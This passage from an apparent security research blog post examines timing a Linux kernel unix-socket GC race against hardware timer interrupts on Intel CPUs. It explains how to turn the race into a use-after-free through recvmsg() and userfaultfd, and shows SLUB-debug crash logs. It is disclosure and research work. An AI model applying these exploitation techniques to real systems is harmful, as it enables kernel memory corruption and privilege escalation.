 <p class="c3"><span class="c1">And that seems to me like there&#39;s still something fundamentally wrong. Sure, if there was a sufficiently large number of discrete events mixed together, the curve would eventually just look like a smooth smear - but it seems unlikely to me that there is such a large number of somewhat-evenly distributed random discrete events. And sure, we do get a small amount of timing inaccuracy from sampling the clock in a spinloop, but that should be bounded to the execution time of that spinloop, and the timing smear is far too big for that.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>So it looks like there is a source of randomness that isn&#39;t a discrete event, but something that introduces a random amount of timing delay within some window. So I became suspicious of the hardware timer. The kernel is using </span><span class="c4">MSR_IA32_TSC_DEADLINE</span><span>, and the Intel SDM tells us that that thing is programmed with a TSC value, which makes it look as if the timer has very high granularity. But </span><span class="c4">MSR_IA32_TSC_DEADLINE</span><span>&nbsp;is a newer mode of the LAPIC timer, and the older LAPIC timer modes were instead programmed in units of the APIC timer frequency. According to the </span><span class="c11"><a class="c121" href="https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.pdf#page=378">Intel SDM, Volume 3A</a></span><span>, section 10.5.4 &quot;APIC Timer&quot;, that is &quot;</span><span class="c16">the processor&rsquo;s bus clock or core crystal clock frequency (when TSC/core crystal clock ratio is enumerated in CPUID leaf 0x15) divided by the value specified in the divide configuration register</span><span>&quot;. This frequency is significantly lower than the TSC frequency. So perhaps </span><span class="c4">MSR_IA32_TSC_DEADLINE</span><span class="c1">&nbsp;is actually just a front-end to the same old APIC timer?</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c1">I tried to measure the difference between the programmed TSC value and when execution was actually interrupted (not when the interrupt handler starts running, but when the old execution context is interrupted - you can measure that if the interrupted execution context is just running RDTSC in a loop); that looks as follows:</span></p>
 <p class="c3"></p>
  
  
 <p class="c3"><span class="c1"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHjsv0uh_9jjLz2XaZ-i_TkybjySAwI8b6eQwNIwbayoTxJjdOu2hfPK9pBY4itBx_SY444RMWU9V2zf608IUUC8mO40y2hXVuK1EZwNRhWcntOwjHaHiel0ufzva2Ft9RGq86nDFohpKbamTnuz79vZ4WWJ1cMS0gbA8HUsygjshxfHmsXgIN_19y/s756/image11.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHjsv0uh_9jjLz2XaZ-i_TkybjySAwI8b6eQwNIwbayoTxJjdOu2hfPK9pBY4itBx_SY444RMWU9V2zf608IUUC8mO40y2hXVuK1EZwNRhWcntOwjHaHiel0ufzva2Ft9RGq86nDFohpKbamTnuz79vZ4WWJ1cMS0gbA8HUsygjshxfHmsXgIN_19y/s756/image11.png" border="0" alt="A graph showing noise. Delays from deadline TSC to last successful TSC read before interrupt look essentially random, in the range from around -130 to around 10." style="max-height: 750; max-width: 600px;"title="A graph showing noise. Delays from deadline TSC to last successful TSC read before interrupt look essentially random, in the range from around -130 to around 10." /></a></span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>As you can see, the expiry of the hardware timer indeed adds a bunch of noise. The size of the timing difference is also very close to the crystal clock frequency - the TSC/core crystal clock ratio on this machine is 117. So I tried plotting the </span><span class="c6">absolute</span><span>&nbsp;TSC values at which execution was interrupted, </span><span class="c6">modulo the TSC / core crystal clock ratio</span><span class="c1">, and got this:</span></p>
 <p class="c3"></p>
  
  
 <p class="c3"><span><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFD8Ox0LairxcMkyQuJrocYf7Cg33_jrE4AuhAPvbfMLm8jY8b_NFN9evyjlLXeLHhkfsji2bFNwE_--csZOKd_daBQJdJwKGbeKzLuRiXhGCze_zFELkzxl3dC69I7i4R9SQWgQG2Gv7QlLwdpAs7HRXNQJfCNB6nHh-_8LFvP03N71uMlw7nWoQB/s543/image9%282%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFD8Ox0LairxcMkyQuJrocYf7Cg33_jrE4AuhAPvbfMLm8jY8b_NFN9evyjlLXeLHhkfsji2bFNwE_--csZOKd_daBQJdJwKGbeKzLuRiXhGCze_zFELkzxl3dC69I7i4R9SQWgQG2Gv7QlLwdpAs7HRXNQJfCNB6nHh-_8LFvP03N71uMlw7nWoQB/s543/image9%282%29.png" border="0" alt="A graph showing a clear grouping around 0, roughly in the range -20 to 10, with some noise scattered over the rest of the graph." style="max-height: 750; max-width: 600px;"title="A graph showing a clear grouping around 0, roughly in the range -20 to 10, with some noise scattered over the rest of the graph." /></a></span></p>
 <p class="c3"><span>This confirms that </span><span class="c4">MSR_IA32_TSC_DEADLINE</span><span>&nbsp;is (apparently) an interface that </span><span class="c6">internally converts the specified TSC value into less granular bus clock / core crystal clock time</span><span class="c1">, at least on some Intel CPUs.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>But there&#39;s still something really weird here: The TSC values at which execution seems to be interrupted were at </span><span class="c6">negative</span><span>&nbsp;offsets relative to the programmed expiry time, as if the timeouts were rounded </span><span class="c6">down</span><span class="c1">&nbsp;to the less granular clock, or something along those lines. To get a better idea of how timer interrupts work, I measured on yet another system (an old Haswell CPU) with a patched kernel when execution is interrupted and when the interrupt handler starts executing relative to the programmed expiry time (and also plotted the difference between the two):</span></p>
 <p class="c3"></p>
  
  
 <p class="c3"><span><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxdpX4IgQCQuV9hIXWbVTSfVhyZ1LaNDfV6NUW0HRri_uI-OrUf0wuUK-SPm1gGO0NsqGPxN5WewnPIJ0FBaF7NSPfL0Nh7MQoGXk3YGgVPP2LwuTUz05Yy7DwKgUkxbQ0vJ5nWB0mlS2rPonc1p3wq11SKtzcpYzP_tnnWb65qW5Q4EGtrhz_7mwC/s928/image17.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxdpX4IgQCQuV9hIXWbVTSfVhyZ1LaNDfV6NUW0HRri_uI-OrUf0wuUK-SPm1gGO0NsqGPxN5WewnPIJ0FBaF7NSPfL0Nh7MQoGXk3YGgVPP2LwuTUz05Yy7DwKgUkxbQ0vJ5nWB0mlS2rPonc1p3wq11SKtzcpYzP_tnnWb65qW5Q4EGtrhz_7mwC/s928/image17.png" border="0" alt="A graph showing that the skid from programmed interrupt time to execution interruption is around -100 to -30 cycles, the skid to interrupt entry is around 360 to 420 cycles, and the time from execution interruption to interrupt entry has much less timing variance and is at around 440 cycles." style="max-height: 750px; max-width: 600px;"title="A graph showing that the skid from programmed interrupt time to execution interruption is around -100 to -30 cycles, the skid to interrupt entry is around 360 to 420 cycles, and the time from execution interruption to interrupt entry has much less timing variance and is at around 440 cycles." /></a></span></p>
 <p class="c3"><span class="c1">So it looks like the CPU starts handling timer interrupts a little bit before the programmed expiry time, but interrupt handler entry takes so long (~450 TSC clock cycles?) that by the time the CPU starts executing the interrupt handler, the timer expiry time has long passed.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>Anyway, the important bit for us is that when the CPU interrupts execution due to timer expiry, it&#39;s always at a LAPIC timer edge; and LAPIC timer edges happen when the TSC value is a multiple of the TSC/LAPIC clock ratio. An exploit that doesn&#39;t take that into account and wrongly assumes that </span><span class="c4">MSR_IA32_TSC_DEADLINE</span><span class="c1">&nbsp;has TSC granularity will have its timing smeared by one LAPIC clock period, which can be something like 40ns.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c1">The ~30% accuracy we could achieve with the existing PoC with the right timing is already not terrible; but if we control for the timer&#39;s weirdness, can we do better?</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>The problem is that we are effectively launching the race with two timers that behave differently: One timer based on calling </span><span class="c4">clock_gettime()</span><span class="c1">&nbsp;in a loop (which uses the high-resolution TSC to compute a time), the other a hardware timer based on the lower-resolution LAPIC clock. I see two options to fix this:</span></p>
 <p class="c0"><span class="c1"></span></p><ol class="c20 lst-kix_94mysn7p9quk-0 start" start="1"><li style="margin-left: 46pt;" class="c3 c14 li-bullet-0"><span class="c1">Try to ensure that the second timer is set at the start of a LAPIC clock period - that way, the second timer should hopefully behave exactly like the first (or have an additional fixed offset, but we can compensate for that).</span></li><li style="margin-left: 46pt;" class="c3 c14 li-bullet-0"><span class="c1">Shift the first timer&#39;s expiry time down according to the distance from the second timer to the previous LAPIC clock period.</span></li></ol>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>(One annoyance with this is that while we can grab information on how wall/monotonic time is calculated from TSC from the vvar mapping used by the vDSO, the clock is subject to minuscule additional corrections at every clock tick, which occur every 4ms on standard distro kernels (with </span><span class="c4">CONFIG_HZ=250</span><span class="c1">) as long as any core is running.)</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c1">I tried to see whether the timing graph would look nicer if I accounted for this LAPIC clock rounding and also used a custom kernel to cheat and control for possible skid introduced by the absolute-to-relative-and-back conversion of the expiry time (see further up), but that still didn&#39;t help all that much.</span></p><h1 class="c15" id="h.na1zwzioj0fl"><span class="c8">(No) surprise: clock speed matters</span></h1>
 <p class="c3"><span class="c1">Something I should&#39;ve thought about way earlier is that of course, clock speed matters. On newer Intel CPUs with P-states, the CPU is normally in control of its own frequency, and dynamically adjusts it as it sees fit; the OS just provides some hints.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>Linux has an interface that claims to tell you the &quot;current frequency&quot; of each CPU core in </span><span class="c4">/sys/devices/system/cpu/cpufreq/policy&lt;n&gt;/scaling_cur_freq</span><span class="c1">, but when I tried using that, I got a different &quot;frequency&quot; every time I read that file, which seemed suspicious.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>Looking at the implementation, it turns out that the value shown there is calculated in </span><span class="c4">arch_freq_get_on_cpu()</span><span>&nbsp;and </span><span>its</span><span>&nbsp;</span><span>callees</span><span>&nbsp;- the value is calculated on demand when the file is read, with results cached for around 10 milliseconds. The value is determined as the ratio between the deltas of </span><span class="c4">MSR_IA32_APERF</span><span>&nbsp;and </span><span class="c4">MSR_IA32_MPERF</span><span class="c1">&nbsp;between the last read and the current one. So if you have some tool that is polling these values every few seconds and wants to show average clock frequency over that time, it&#39;s probably a good way of doing things; but if you actually want the current clock frequency, it&#39;s not a good fit.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c1">I hacked a helper into my kernel that samples both MSRs twice in quick succession, and that gives much cleaner results. When I measure the clock speeds and timing offsets at which the race succeeds, the result looks like this (showing just two clock speeds; the Y axis is the number of race successes at the clock offset specified on the X axis and the frequency scaling specified by the color):</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"></p>
  
  
 <p class="c3"><span><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgteZAepQr9rN7W0YShZIs3QBtqs-9FAJ9uW2wTTH9PSXSXxRMnCwOr9Ystgmi4EfD8ikHkCF0gHIV6s0A1rnnEAHEkl-7cBgLOgmTeDgep0PDO6ukZa6bzFqxCi48yQ46s5iZqSNvx2Dn05XCyVgYnLtqsuUvgyCeYxSRF_eOg4-xFDa7bWKzUD676/s666/image1%20%281%29%281%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgteZAepQr9rN7W0YShZIs3QBtqs-9FAJ9uW2wTTH9PSXSXxRMnCwOr9Ystgmi4EfD8ikHkCF0gHIV6s0A1rnnEAHEkl-7cBgLOgmTeDgep0PDO6ukZa6bzFqxCi48yQ46s5iZqSNvx2Dn05XCyVgYnLtqsuUvgyCeYxSRF_eOg4-xFDa7bWKzUD676/s666/image1%20%281%29%281%29.png" border="0" alt="A graph showing that the timing of successful race attempts depends on the CPU&#39;s performance setting - at 11/28 performance, most successful race attempts occur around clock offset -1200 (in TSC units), while at 14/28 performance, most successful race attempts occur around clock offset -1000." style="max-height: 750; max-width: 600px;"title="A graph showing that the timing of successful race attempts depends on the CPU&#39;s performance setting - at 11/28 performance, most successful race attempts occur around clock offset -1200 (in TSC units), while at 14/28 performance, most successful race attempts occur around clock offset -1000." /></a></span></p>
 <p class="c3"><span class="c1">So clearly, dynamic frequency scaling has a huge impact on the timing of the race - I guess that&#39;s to be expected, really.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>But even accounting for all this, the graph still looks kind of smooth, so clearly there is still something more that I&#39;m missing - oh well. I decided to stop experimenting with the race&#39;s timing at this point, since I didn&#39;t want to sink too much time into it. (Or perhaps I actually just stopped because I got distracted by newer and shinier things?)</span></p><h1 class="c15" id="h.ktiklcw2yj2x"><span>Causing a UAF</span></h1>
 <p class="c3"><span>Anyway, I could probably spend much more time trying to investigate the timing variations (and probably mostly bang my head against a wall because details of execution timing are really difficult to understand in detail, and to understand it completely, it might be necessary to use something like </span><span class="c11"><a class="c121" href="https://gamozolabs.github.io/metrology/2019/08/19/sushi_roll.html">Gamozo Labs&#39; &quot;Sushi Roll&quot;</a></span><span class="c1">&nbsp;and then go through every single instruction in detail and compare the observations to the internal architecture of the CPU). Let&#39;s not do that, and get back to how to actually exploit this bug!</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>To turn this bug into memory corruption, we have to abuse that the </span><span class="c4">recvmsg()</span><span>&nbsp;path assumes that SKBs on the receive queue are protected from deletion by the socket mutex while the GC actually deletes SKBs from the receive queue without touching the socket mutex. For that purpose, while the unix GC is running, we have to start a </span><span class="c4">recvmsg()</span><span>&nbsp;call that looks up the victim SKB, block until the unix GC has freed the SKB, and then let </span><span class="c4">recvmsg()</span><span>&nbsp;continue operating on the freed SKB. This is fairly straightforward - while it is a race, we can easily slow down </span><span class="c4">unix_gc()</span><span class="c1">&nbsp;for multiple milliseconds by creating lots of sockets that are not directly referenced from the FD table and have many tiny SKBs queued up - here&#39;s a graph showing the unix GC execution time on my laptop, depending on the number of queued SKBs that the GC has to scan through:</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"></p>
  
  
 <p class="c3"><span><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiBiMkb5gF1P8Epsw3zNsmjcesB53u-1TWswpWkW-YPl9vBXPF116eQG2v-wx7Kv7Wvb8fcUCoxU5O6VJ5854OdJWXKoSzPxBvBp0atr1HLiSyB1SqvqBTxba28bREm610sKCoFN7kA2ABwWNcq_vbmkPnH7oKGIwRV8gYcxHQ2JoWPf0eIYmO6y1Rq/s833/image15.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiBiMkb5gF1P8Epsw3zNsmjcesB53u-1TWswpWkW-YPl9vBXPF116eQG2v-wx7Kv7Wvb8fcUCoxU5O6VJ5854OdJWXKoSzPxBvBp0atr1HLiSyB1SqvqBTxba28bREm610sKCoFN7kA2ABwWNcq_vbmkPnH7oKGIwRV8gYcxHQ2JoWPf0eIYmO6y1Rq/s833/image15.png" border="0" alt="A graph showing the time spent per GC run depending on the number of queued SKBs. The relationship is roughly linear." style="max-height: 750; max-width: 600px;"title="A graph showing the time spent per GC run depending on the number of queued SKBs. The relationship is roughly linear." /></a></span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>To turn this into a UAF, it&#39;s also necessary to get past the following check near the end of </span><span class="c4">unix_gc()</span><span class="c1">:</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c7 c4">&nbsp; &nbsp; &nbsp; &nbsp;/* All candidates should have been detached by now. */</span></p>
 <p class="c3"><span class="c7 c4">&nbsp; &nbsp; &nbsp; &nbsp; BUG_ON(!list_empty(&amp;gc_candidates));</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c4">gc_candidates</span><span>&nbsp;is a list that previously contained all sockets that were deemed to be unreachable by the GC. Then, the GC attempted to free all those sockets by eliminating their mutual references. If we manage to keep a reference to one of the sockets that the GC thought was going away, the GC detects that with the </span><span class="c4">BUG_ON()</span><span class="c1">.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>But we don&#39;t actually need the victim SKB to reference a socket that the GC thinks is going away; in </span><span class="c4">scan_inflight()</span><span>, the GC targets any SKB with a socket that is marked </span><span class="c4">UNIX_GC_CANDIDATE</span><span>, meaning it just had to be </span><span class="c6">a candidate</span><span>&nbsp;for being scanned by the GC. So by making the victim SKB hold a reference to a socket that is not directly referenced from a file descriptor table, but is indirectly referenced by a file descriptor table through another socket, we can ensure that the </span><span class="c4">BUG_ON()</span><span class="c1">&nbsp;won&#39;t trigger.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>I extended </span><span class="c11"><a class="c121" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2247#c6">my reproducer</a></span><span>&nbsp;with this trick and some userfaultfd trickery to make </span><span class="c4">recv()</span><span>&nbsp;run with the right timing. Nowadays you don&#39;t necessarily get full access to userfaultfd as a normal user, but since I&#39;m just trying to show the concept, and there are alternatives to userfaultfd</span><span>&nbsp;(using FUSE or just slow disk access</span><span>)</span><span>,</span><span class="c1">&nbsp;that&#39;s good enough for this blogpost.</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>When a normal distro kernel is running normally, the UAF reproducer&#39;s UAF accesses won&#39;t actually be noticeable; but if you add the kernel command line flag </span><span class="c4">slub_debug=FP</span><span class="c1">&nbsp;(to enable SLUB&#39;s poisoning and sanity checks), the reproducer quickly crashes twice, first with a poison dereference and then a poison overwrite detection, showing that one byte of the poison was incremented:</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span class="c2">general protection fault, probably for non-canonical address 0x6b6b6b6b6b6b6b6b: 0000 [#1] SMP NOPTI</span></p>
 <p class="c3"><span class="c2">CPU: 1 PID: 2655 Comm: hardirq_loop Not tainted 5.10.0-9-amd64 #1 Debian 5.10.70-1</span></p>
 <p class="c3"><span class="c2">[...]</span></p>
 <p class="c3"><span class="c2">RIP: 0010:unix_stream_read_generic+0x72b/0x870</span></p>
 <p class="c3"><span class="c2">Code: fe ff ff 31 ff e8 85 87 91 ff e9 a5 fe ff ff 45 01 77 44 8b 83 80 01 00 00 85 c0 0f 89 10 01 00 00 49 8b 47 38 48 85 c0 74 23 &lt;0f&gt; bf 00 66 85 c0 0f 85 20 01 00 00 4c 89 fe 48 8d 7c 24 58 44 89</span></p>
 <p class="c3"><span class="c2">RSP: 0018:ffffb789027f7cf0 EFLAGS: 00010202</span></p>
 <p class="c3"><span class="c2">RAX: 6b6b6b6b6b6b6b6b RBX: ffff982d1d897b40 RCX: 0000000000000000</span></p>
 <p class="c3"><span class="c2">RDX: 6a0fe1820359dce8 RSI: ffffffffa81f9ba0 RDI: 0000000000000246</span></p>
 <p class="c3"><span class="c2">RBP: ffff982d1d897ea8 R08: 0000000000000000 R09: 0000000000000000</span></p>
 <p class="c3"><span class="c2">R10: 0000000000000000 R11: ffff982d2645c900 R12: ffffb789027f7dd0</span></p>
 <p class="c3"><span class="c2">R13: ffff982d1d897c10 R14: 0000000000000001 R15: ffff982d3390e000</span></p>
 <p class="c3"><span class="c2">FS: &nbsp;00007f547209d740(0000) GS:ffff98309fa40000(0000) knlGS:0000000000000000</span></p>
 <p class="c3"><span class="c2">CS: &nbsp;0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span></p>
 <p class="c3"><span class="c2">CR2: 00007f54722cd000 CR3: 00000001b61f4002 CR4: 0000000000770ee0</span></p>
 <p class="c3"><span class="c2">PKRU: 55555554</span></p>
 <p class="c3"><span class="c2">Call Trace:</span></p>
 <p class="c3"><span class="c2">[...]</span></p>
 <p class="c3"><span class="c2">&nbsp;unix_stream_recvmsg+0x53/0x70</span></p>
 <p class="c3"><span class="c2">[...]</span></p>
 <p class="c3"><span class="c2">&nbsp;__sys_recvfrom+0x166/0x180</span></p>
 <p class="c3"><span class="c2">[...]</span></p>
 <p class="c3"><span class="c2">&nbsp;__x64_sys_recvfrom+0x25/0x30</span></p>
 <p class="c3"><span class="c2">&nbsp;do_syscall_64+0x33/0x80</span></p>
 <p class="c3"><span class="c2">&nbsp;entry_SYSCALL_64_after_hwframe+0x44/0xa9</span></p>
 <p class="c3"><span class="c2">[...]</span></p>
 <p class="c3"><span class="c2">---[ end trace 39a81eb3a52e239c ]---</span></p>
 <p class="c3"><span class="c2">=============================================================================</span></p>
 <p class="c3"><span class="c2">BUG skbuff_head_cache (Tainted: G &nbsp; &nbsp; &nbsp;D &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;): Poison overwritten</span></p>
 <p class="c3"><span class="c2">-----------------------------------------------------------------------------</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c3"><span class="c2">INFO: 0x00000000d7142451-0x00000000d7142451 @offset=68. First byte 0x6c instead of 0x6b</span></p>
 <p class="c3"><span class="c2">INFO: Slab 0x000000002f95c13c objects=32 used=32 fp=0x0000000000000000 flags=0x17ffffc0010200</span></p>
 <p class="c3"><span class="c2">INFO: Object 0x00000000ef9c59c8 @offset=0 fp=0x00000000100a3918</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c3"><span class="c2">Object &nbsp; 00000000ef9c59c8: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &nbsp;kkkkkkkkkkkkkkkk</span></p>
 <p class="c3"><span class="c2">Object &nbsp; 0000000097454be8: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &nbsp;kkkkkkkkkkkkkkkk</span></p>
 <p class="c3"><span class="c2">Object &nbsp; 0000000035f1d791: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &nbsp;kkkkkkkkkkkkkkkk</span></p>
 <p class="c3"><span class="c2">Object &nbsp; 00000000af71b907: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &nbsp;kkkkkkkkkkkkkkkk</span></p>
 <p class="c3"><span class="c4 c9">Object &nbsp; 000000000d2d371e: 6b 6b 6b 6b </span><span class="c6 c18 c9 c25">6c</span><span class="c2">&nbsp;6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &nbsp;kkkklkkkkkkkkkkk</span></p>
 <p class="c3"><span class="c2">Object &nbsp; 0000000000744b35: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &nbsp;kkkkkkkkkkkkkkkk</span></p>
 <p class="c3"><span class="c2">Object &nbsp; 00000000794f2935: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &nbsp;kkkkkkkkkkkkkkkk</span></p>
 <p class="c3"><span class="c2">Object &nbsp; 000000006dc06746: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &nbsp;kkkkkkkkkkkkkkkk</span></p>
 <p class="c3"><span class="c2">Object &nbsp; 000000005fb18682: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &nbsp;kkkkkkkkkkkkkkkk</span></p>
 <p class="c3"><span class="c2">Object &nbsp; 0000000072eb8dd2: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &nbsp;kkkkkkkkkkkkkkkk</span></p>
 <p class="c3"><span class="c2">Object &nbsp; 00000000b5b572a9: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &nbsp;kkkkkkkkkkkkkkkk</span></p>
 <p class="c3"><span class="c2">Object &nbsp; 0000000085d6850b: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &nbsp;kkkkkkkkkkkkkkkk</span></p>
 <p class="c3"><span class="c2">Object &nbsp; 000000006346150b: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &nbsp;kkkkkkkkkkkkkkkk</span></p>
 <p class="c3"><span class="c2">Object &nbsp; 000000000ddd1ced: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b a5 &nbsp;kkkkkkkkkkkkkkk.</span></p>
 <p class="c3"><span class="c2">Padding &nbsp;00000000e00889a7: 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a &nbsp;ZZZZZZZZZZZZZZZZ</span></p>
 <p class="c3"><span class="c2">Padding &nbsp;00000000d190015f: 5a 5a 5a 5a 5a 5a 5a 5a &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ZZZZZZZZ</span></p>
 <p class="c3"><span class="c2">CPU: 7 PID: 1641 Comm: gnome-shell Tainted: G &nbsp; &nbsp;B D &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 5.10.0-9-amd64 #1 Debian 5.10.70-1</span></p>
 <p class="c3"><span class="c2">[...]</span></p>
 <p class="c3"><span class="c2">Call Trace:</span></p>
 <p class="c3"><span class="c2">&nbsp;dump_stack+0x6b/0x83</span></p>
 <p class="c3"><span class="c2">&nbsp;check_bytes_and_report.cold+0x79/0x9a</span></p>
 <p class="c3"><span class="c2">&nbsp;check_object+0x217/0x260</span></p>
 <p class="c3"><span class="c2">[...]</span></p>
 <p class="c3"><span class="c2">&nbsp;alloc_debug_processing+0xd5/0x130</span></p>
 <p class="c3"><span class="c2">&nbsp;___slab_alloc+0x511/0x570</span></p>
 <p class="c3"><span class="c2">[...]</span></p>
 <p class="c3"><span class="c2">&nbsp;__slab_alloc+0x1c/0x30</span></p>
 <p class="c3"><span class="c2">&nbsp;kmem_cache_alloc_node+0x1f3/0x210</span></p>
 <p class="c3"><span class="c2">&nbsp;__alloc_skb+0x46/0x1f0</span></p>
 <p class="c3"><span class="c2">&nbsp;alloc_skb_with_frags+0x4d/0x1b0</span></p>
 <p class="c3"><span class="c2">&nbsp;sock_alloc_send_pskb+0x1f3/0x220</span></p>
 <p class="c3"><span class="c2">[...]</span></p>
 <p class="c3"><span class="c2">&nbsp;unix_stream_sendmsg+0x268/0x4d0</span></p>
 <p class="c3"><span class="c2">&nbsp;sock_sendmsg+0x5e/0x60</span></p>
 <p class="c3"><span class="c2">&nbsp;____sys_sendmsg+0x22e/0x270</span></p>
 <p class="c3"><span class="c2">[...]</span></p>
 <p class="c3"><span class="c2">&nbsp;___sys_sendmsg+0x75/0xb0</span></p>
 <p class="c3"><span class="c2">[...]</span></p>
 <p class="c3"><span class="c2">&nbsp;__sys_sendmsg+0x59/0xa0</span></p>
 <p class="c3"><span class="c2">&nbsp;do_syscall_64+0x33/0x80</span></p>
 <p class="c3"><span class="c2">&nbsp;entry_SYSCALL_64_after_hwframe+0x44/0xa9</span></p>
 <p class="c3"><span class="c2">[...]</span></p>
 <p class="c3"><span class="c2">FIX skbuff_head_cache: Restoring 0x00000000d7142451-0x00000000d7142451=0x6b</span></p>
 <p class="c0"><span class="c2"></span></p>
 <p class="c3"><span class="c2">FIX skbuff_head_cache: Marking all objects used</span></p>
 <p class="c3"><span class="c2">RIP: 0010:unix_stream_read_generic+0x72b/0x870</span></p>
 <p class="c3"><span class="c2">Code: fe ff ff 31 ff e8 85 87 91 ff e9 a5 fe ff ff 45 01 77 44 8b 83 80 01 00 00 85 c0 0f 89 10 01 00 00 49 8b 47 38 48 85 c0 74 23 &lt;0f&gt; bf 00 66 85 c0 0f 85 20 01 00 00 4c 89 fe 48 8d 7c 24 58 44 89</span></p>
 <p class="c3"><span class="c2">RSP: 0018:ffffb789027f7cf0 EFLAGS: 00010202</span></p>
 <p class="c3"><span class="c2">RAX: 6b6b6b6b6b6b6b6b RBX: ffff982d1d897b40 RCX: 0000000000000000</span></p>
 <p class="c3"><span class="c2">RDX: 6a0fe1820359dce8 RSI: ffffffffa81f9ba0 RDI: 0000000000000246</span></p>
 <p class="c3"><span class="c2">RBP: ffff982d1d897ea8 R08: 0000000000000000 R09: 0000000000000000</span></p>
 <p class="c3"><span class="c2">R10: 0000000000000000 R11: ffff982d2645c900 R12: ffffb789027f7dd0</span></p>
 <p class="c3"><span class="c2">R13: ffff982d1d897c10 R14: 0000000000000001 R15: ffff982d3390e000</span></p>
 <p class="c3"><span class="c2">FS: &nbsp;00007f547209d740(0000) GS:ffff98309fa40000(0000) knlGS:0000000000000000</span></p>
 <p class="c3"><span class="c2">CS: &nbsp;0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span></p>
 <p class="c3"><span class="c2">CR2: 00007f54722cd000 CR3: 00000001b61f4002 CR4: 0000000000770ee0</span></p>
 <p class="c3"><span class="c4 c9">PKRU: 55555554</span></p><h1 class="c15" id="h.pjkt5u3x5bd1"><span>Conclusion(s)</span></h1>
 <p class="c3"><span class="c1">Hitting a race can become easier if, instead of racing two threads against each other, you race one thread against a hardware timer to create a gigantic timing window for the other thread. Hence the title! On the other hand, it introduces extra complexity because now you have to think about how timers actually work, and turns out, time is a complicated concept...</span></p>
 <p class="c0"><span class="c1"></span></p>
 <p class="c3"><span>This shows how at least some really tight races can still be hit and </span><span>we should treat them</span><span>&nbsp;as security bugs, even if it seems like they&#39;d be very hard to hit at first glance.</span></p>
 <p class="c0"><span class="c1"></span></p>
